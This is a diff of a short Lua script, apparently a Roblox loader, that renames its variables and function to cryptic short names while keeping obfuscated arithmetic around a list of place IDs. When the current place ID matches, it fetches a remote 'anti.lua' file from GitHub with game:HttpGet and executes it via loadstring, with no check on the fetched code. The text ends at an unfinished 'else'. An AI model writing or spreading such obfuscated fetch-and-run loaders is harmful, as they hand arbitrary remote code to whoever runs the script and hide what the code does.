@@ -1,22 +1,22 @@
-local dataStore = {
+local ds = {
     (142823291 * 2) / 2, 
     (6205205961 - 100) + 100, 
     (335132309 % 1000000000), 
     (636649648 / 1) 
 }
 
-local sessionID = game.PlaceId
+local ssd = game.PlaceId
 
-local function validateAccess(mapIdentifier)
-    for index, value in next, dataStore do
-        if (mapIdentifier - value == 0) then
+local function BA(mp)
+    for index, value in next, ds do
+        if (mp - value == 0) then
             return true
         end
     end
     return false
 end
 
-if validateAccess(sessionID) then
+if BA(ssd) then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/test/refs/heads/main/anti.lua"))()
 
 else
